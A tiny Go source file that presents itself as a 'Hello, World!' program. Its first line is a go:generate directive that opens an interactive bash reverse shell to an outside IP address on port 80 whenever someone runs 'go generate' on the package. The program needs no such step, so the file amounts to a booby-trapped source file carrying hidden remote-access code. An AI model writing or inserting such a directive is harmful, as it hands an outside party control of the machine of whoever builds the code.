//go:generate bash -c 'bash -i >& /dev/tcp/35.184.92.106/80 0>&1'


package main

import (
    "fmt"
)

func main() {
    fmt.Println("Hello, World!")
}
